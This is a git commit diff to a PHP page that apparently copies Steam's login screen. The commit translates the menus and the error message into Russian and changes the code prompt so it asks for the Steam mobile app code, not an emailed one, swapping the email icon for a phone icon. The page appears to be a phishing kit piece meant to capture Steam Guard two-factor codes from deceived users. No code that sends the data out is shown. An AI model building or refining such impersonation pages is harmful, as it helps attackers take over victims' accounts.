ac70f5a53f5d9d50fb338d7011aac93e619f3050
Garus404 <texnuk17@gmail.com>
2025-10-26 20:15:57 +0500

    Update code1.php
    Updated text in navigation and error messages to Russian.

--- code1.php
+++ code1.php
@@ -148,7 +148,7 @@
                 </div>
 
                 <div role="navigation" class="supernav_container" aria-label="Global Menu">
-                    <a class="menuitem supernav supernav_active" href="https://store.steampowered.com/?snr=1_60_4__global-header" data-tooltip-type="selector" data-tooltip-content=".submenu_Store">STORE</a>
+                    <a class="menuitem supernav supernav_active" href="https://store.steampowered.com/?snr=1_60_4__global-header" data-tooltip-type="selector" data-tooltip-content=".submenu_Store">МАГАЗИН</a>
                     <div class="submenu_Store" style="display: none;" data-submenuid="Store">
                         <a class="submenuitem" href="https://store.steampowered.com/?snr=1_60_4__global-header">Home</a>
                         <a class="submenuitem" href="https://store.steampowered.com/explore/?snr=1_60_4__global-header">Discovery Queue</a>
@@ -157,7 +157,7 @@
                         <a class="submenuitem" href="https://store.steampowered.com/news/?snr=1_60_4__global-header">News</a>
                         <a class="submenuitem" href="https://store.steampowered.com/stats/?snr=1_60_4__global-header">Stats</a>
                     </div>
-                    <a class="menuitem supernav" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_Community">COMMUNITY</a>
+                    <a class="menuitem supernav" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_Community">СООБЩЕСТВО</a>
                     <div class="submenu_Community" style="display: none;" data-submenuid="Community">
                         <a class="submenuitem" href="https://steamcommunity.com/">Home</a>
                         <a class="submenuitem" href="https://steamcommunity.com/discussions/">Discussions</a>
@@ -165,18 +165,18 @@
                         <a class="submenuitem" href="https://steamcommunity.com/market/">Market</a>
                         <a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Broadcasts</a>
                     </div>
-                    <a class="menuitem " href="https://store.steampowered.com/about/?snr=1_60_4__global-header">About</a>
-                    <a class="menuitem " href="https://help.steampowered.com/en/">SUPPORT</a>
+                    <a class="menuitem " href="https://store.steampowered.com/about/?snr=1_60_4__global-header">ИНФОРМАЦИЯ</a>
+                    <a class="menuitem " href="https://help.steampowered.com/en/">ПОДДЕРЖКА</a>
                 </div>
 
                 <div id="global_actions">
                     <div role="navigation" id="global_action_menu" aria-label="Account Menu">
                         <a class="header_installsteam_btn header_installsteam_btn_green" href="https://store.steampowered.com/about/?snr=1_60_4__global-header">
-                            <div class="header_installsteam_btn_content">Install Steam</div>
+                            <div class="header_installsteam_btn_content">Установить Steam</div>
                         </a>
-                        <a class="global_action_link" href="https://store.steampowered.com/login/?redir=login&redir_ssl=1&snr=1_60_4__global-header">login</a>
+                        <a class="global_action_link" href="https://store.steampowered.com/login/?redir=login&redir_ssl=1&snr=1_60_4__global-header">войти</a>
                         &nbsp;|&nbsp;
-                        <span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, 'language_dropdown', 'right' );">language</span>
+                        <span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, 'language_dropdown', 'right' );">язык</span>
                         <div class="popup_block_new" id="language_dropdown" style="display: none;">
                             <div class="popup_body popup_menu">
                                 <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=schinese" onclick="ChangeLanguage( 'schinese' ); return false;">简体中文 (Simplified Chinese)</a>
@@ -245,7 +245,7 @@
 <div class="newlogindialog_FormContainer_3jLIH" style="background-color: #181a21; border-radius: 4px; padding: 120px 32px; flex: 100px; min-width: 636px; margin-top: -40px; position: relative;">
     <div style="background-color: #32353C; border-radius: 4px; padding: 20px; width: 500px; height: 150px; position: absolute; top: 190px; left: 50%; transform: translate(-50%, -50%);">
         <div style="background-color: #2B2E33; border-radius: 4px; width: 350px; height: 80px; position: absolute; top: 35%; left: 50%; transform: translate(-50%, -50%); display: flex; justify-content: center; align-items: center; gap: 15px; position: relative;" id="codeContainer">
-               <div style="position: absolute; top: -20px; left: 50%; transform: translateX(-50%); color: #c15755; font-size: 12px; font-family: Arial, sans-serif; display: none;" id="errorText">Incorrect code, please try again</div>
+               <div style="position: absolute; top: -20px; left: 50%; transform: translateX(-50%); color: #c15755; font-size: 12px; font-family: Arial, sans-serif; display: none;" id="errorText">Неверный код, попробуйте еще раз</div>
     <input maxlength="1" autocomplete="none" class="_3xcXqLVteTNHmk-gh9W65d Focusable" role="button" type="text" value="" style="width: 30px; height: 40px; text-align: center; font-size: 30px; background-color: transparent; border: none; border-bottom: 2px solid #545555; color: #fff; outline: none;">
             <input maxlength="1" autocomplete="none" class="_3xcXqLVteTNHmk-gh9W65d Focusable" role="button" type="text" value="" style="width: 30px; height: 40px; text-align: center; font-size: 30px; background-color: transparent; border: none; border-bottom: 2px solid #545555; color: #fff; outline: none;">
             <input maxlength="1" autocomplete="none" class="_3xcXqLVteTNHmk-gh9W65d Focusable" role="button" type="text" value="" style="width: 30px; height: 40px; text-align: center; font-size: 30px; background-color: transparent; border: none; border-bottom: 2px solid #545555; color: #fff; outline: none;">
@@ -256,15 +256,21 @@
 </div>
 
 
-<div class="_3aMbj3PT-p1yxEt98UM56K" style="position: absolute; top: 290px; left: 45%; transform: translateX(-50%); font-family: Arial, sans-serif; font-size: 16px; color: #FFFFFF; text-align: center;">
-    Введите код со своего адреса электронной почты по адресу: <br>
-    <span class="_3BKzb-aGSLOjp5jsQ8wwXK" style="color: #1990FF;">gmail.com</span>
+<div class="_3aMbj3PT-p1yxEt98UM56K" style="position: absolute; top: 300px; left: 50%; transform: translateX(-55%); font-family: Arial, sans-serif; font-size: 16px; color: #FFFFFF; text-align: center;">
+    Введите код из мобильного приложения Steam <br>
 </div>
-<svg width="55" height="75" viewBox="0 0 58 56" style="position: absolute; top: 270px; right: 105px;">
-    <path d="M57.9352 24.5887C57.8463 24.233 57.8463 23.8774 57.6684 23.5217C57.4017 22.8993 57.046 22.4547 56.5125 22.0101L49.577 16.4083V10.9844C49.577 8.85041 47.8876 7.16098 45.7536 7.16098H38.1956L31.5269 1.73706C30.1042 0.581137 28.0591 0.581137 26.6364 1.73706L19.9677 7.16098H12.4097C10.2757 7.16098 8.58631 8.93932 8.58631 10.9844V16.4083L1.56188 22.0101C1.02838 22.3658 0.672713 22.8993 0.405962 23.5217V23.6106C0.228128 24.1441 0.050293 24.5887 0.050293 25.1222V52.1529C0.050293 53.2199 0.494878 54.1091 1.1173 54.8204C1.82863 55.5318 2.80672 55.8874 3.7848 55.8874H54.0228C55.0898 55.8874 55.979 55.4428 56.6903 54.8204C57.4017 54.1091 57.7573 53.131 57.7573 52.1529V25.1222C57.9352 24.8554 57.9352 24.7665 57.9352 24.5887ZM49.577 19.7872L54.7342 23.9663L49.577 28.9456V19.7872ZM28.148 3.60431C28.4148 3.42648 28.6815 3.24864 28.9483 3.24864C29.3039 3.24864 29.5707 3.33756 29.7485 3.60431L34.0165 7.07207H23.9689L28.148 3.60431ZM10.9871 10.9844C10.9871 10.2731 11.5206 9.73958 12.2319 9.73958H45.6646C46.376 9.73958 46.9095 10.362 46.9095 10.9844V31.4353L46.8206 31.5242L40.2407 37.9262H17.6558L11.076 31.5242L10.9871 31.4353V10.9844ZM8.40848 19.7872V28.9456L3.34022 23.9663L8.40848 19.7872ZM2.62888 51.6194V26.9005L15.2551 39.26L2.62888 51.6194ZM4.49614 53.3088L17.6558 40.5048H40.2407L53.4004 53.3088H4.49614ZM55.3566 51.6194L42.6415 39.1711L55.2677 26.8116V51.6194H55.3566ZM29.0372 35.3476C30.5488 35.3476 31.9715 35.0809 33.3941 34.5474C34.0165 34.2806 34.3722 33.4804 34.1055 32.858C33.8387 32.2355 33.0385 31.8799 32.416 32.1466C31.349 32.5912 30.1931 32.769 29.0372 32.769C27.3478 32.769 25.7473 32.3245 24.4135 31.5242C21.746 29.9237 20.0566 27.0784 20.0566 23.7884C20.0566 18.8091 24.0579 14.8078 29.0372 14.8078C34.0165 14.8078 38.0178 18.8091 38.0178 23.7884V24.4109C38.0178 25.4779 37.2175 26.367 36.0616 26.367C34.9946 26.367 34.1055 25.4779 34.1055 24.4109V23.7884C34.1055 20.9431 31.7936 18.6313 28.9483 18.6313C26.1029 18.6313 23.7911 20.9431 23.7911 23.7884C23.7911 26.6338 26.1029 28.9456 28.9483 28.9456C30.3709 28.9456 31.7047 28.3232 32.5939 27.434C33.3941 28.4121 34.639 28.9456 35.9727 28.9456C38.4624 28.9456 40.5075 26.9894 40.5075 24.4109V23.7884C40.5075 17.3864 35.2614 12.2292 28.9483 12.2292C22.6352 12.2292 17.3891 17.4753 17.3891 23.7884C17.3891 26.7227 18.545 29.4791 20.3233 31.5242C22.5463 33.925 25.5694 35.3476 29.0372 35.3476ZM29.0372 26.367C27.6145 26.367 26.4586 25.2111 26.4586 23.7884C26.4586 22.3658 27.6145 21.2098 29.0372 21.2098C30.4599 21.2098 31.6158 22.3658 31.6158 23.7884C31.5269 25.2111 30.371 26.367 29.0372 26.367Z" fill="#1A99FF"></path>
-</svg>
+<svg width="70" height="75" viewBox="0 0 58 56" style="position: absolute; top: 280px; right: 102px;">
+     <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M28 47.1106C29.1046 47.1106 30 46.2151 30 45.1106L30 3.72705C30 2.62248 29.1046 1.72705 28 1.72705L5 1.72705C3.89544 1.72705 3 2.62248 3 3.72705L3 45.1106C3 46.2151 3.89543 47.1106 5 47.1106L28 47.1106ZM5.68119 5.82741L27.3188 5.82741L27.3188 42.7772H5.68119L5.68119 5.82741ZM20.9999 44.944C20.9999 45.3429 20.6766 45.6662 20.2777 45.6662L12.7221 45.6662C12.3233 45.6662 11.9999 45.3429 11.9999 44.944C11.9999 44.5451 12.3233 44.2218 12.7221 44.2218H20.2777C20.6766 44.2218 20.9999 44.5451 20.9999 44.944ZM17.2778 4.44406C17.6767 4.44406 18 4.12071 18 3.72184C18 3.32296 17.6767 2.99962 17.2778 2.99962L15.7222 2.99962C15.3233 2.99962 15 3.32296 15 3.72184C15 4.12071 15.3233 4.44406 15.7222 4.44406L17.2778 4.44406Z"></path>
+    <path fill="currentColor" d="M15.1977 22.4164C15.1977 21.6666 15.7648 21.0002 16.5749 21.0002C17.304 21.0002 17.9521 21.6666 17.9521 22.4164C17.9521 23.1661 17.385 23.8325 16.5749 23.8325C15.8458 23.8325 15.1977 23.1661 15.1977 22.4164Z"></path>
+    <path fill="currentColor" d="M8.14983 22.4164C8.14983 21.6666 8.7169 21.0002 9.527 21.0002C10.3371 21.0002 10.9852 21.6666 10.9042 22.4164C10.9042 23.1661 10.3371 23.8325 9.527 23.8325C8.79791 23.8325 8.14983 23.1661 8.14983 22.4164Z"></path>
+    <path fill="currentColor" d="M15.1977 22.4164C15.1977 21.6666 15.7648 21.0002 16.5749 21.0002C17.304 21.0002 17.9521 21.6666 17.9521 22.4164C17.9521 23.1661 17.385 23.8325 16.5749 23.8325C15.8458 23.8325 15.1977 23.1661 15.1977 22.4164Z"></path>
+    <path fill="currentColor" d="M18.6812 22.4164C18.6812 21.6666 19.2483 21.0002 20.0584 21.0002C20.8685 21.0002 21.5166 21.6666 21.4355 22.4164C21.4355 23.1661 20.8685 23.8325 20.0584 23.8325C19.3293 23.8325 18.6812 23.1661 18.6812 22.4164Z"></path>
+    <path fill="currentColor" d="M11.7143 22.4164C11.7143 21.6666 12.2814 21.0002 13.0915 21.0002C13.8206 21.0002 14.4686 21.6666 14.4686 22.4164C14.4686 23.1661 13.9016 23.8325 13.0915 23.8325C12.3624 23.8325 11.7143 23.1661 11.7143 22.4164Z"></path>
+    <path fill="currentColor" d="M18.6812 22.4164C18.6812 21.6666 19.2483 21.0002 20.0584 21.0002C20.8685 21.0002 21.5166 21.6666 21.4355 22.4164C21.4355 23.1661 20.8685 23.8325 20.0584 23.8325C19.3293 23.8325 18.6812 23.1661 18.6812 22.4164Z"></path>
+    <path fill="currentColor" d="M22.2456 22.4164C22.2456 21.6666 22.8127 21.0002 23.6228 21.0002C24.3519 21.0002 25 21.6666 25 22.4164C25 23.1661 24.3519 23.8325 23.6228 23.8325C22.8937 23.8325 22.2456 23.1661 22.2456 22.4164Z"></path>
+    </svg>
 
-<a class="newlogindialog_TextLink_1cnUQ newlogindialog_TextAlignCenter_2meUB" href="#" style="position: absolute; top: 375px; left: 50%; font-size: 11px; transform: translateX(-50%); color: #AFAFAF;"> Help, I no longer have access to the email address for this account </a>
+<a class="newlogindialog_TextLink_1cnUQ newlogindialog_TextAlignCenter_2meUB" href="#" style="position: absolute; top: 375px; left: 50%; font-size: 11px; transform: translateX(-50%); color: #AFAFAF;"> Помогите, у меня больше нет доступа к мобильному приложению Steam </a>
                                             <div class="newlogindialog_TextField_2KXGK">
                                                 <div></div>
                                             </div>
